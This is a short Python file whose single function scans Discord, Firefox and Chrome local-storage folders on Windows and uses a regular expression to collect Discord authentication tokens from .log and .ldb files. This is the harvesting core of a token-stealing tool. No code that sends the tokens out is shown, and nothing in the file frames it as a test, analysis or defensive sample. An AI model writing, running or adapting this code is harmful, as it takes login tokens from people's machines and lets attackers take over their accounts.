import os
import re

def find_tokens():
    found = []
    app_paths = [
        os.path.expandvars(r"%APPDATA%\Discord"),
        os.path.expandvars(r"%APPDATA%\Mozilla\Firefox\Profiles"),
        os.path.expandvars(r"%APPDATA%\Google\Chrome\User Data\Default\Local Storage\leveldb")
    ]
    token_regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"

    for path in app_paths:
        if os.path.isdir(path):
            for root, _, files in os.walk(path):
                for f in files:
                    if f.endswith((".log", ".ldb")):
                        try:
                            with open(os.path.join(root, f), "r", errors="ignore") as file:
                                for line in file:
                                    for match in re.findall(token_regex, line):
                                        found.append(match)
                        except:
                            continue
    return found
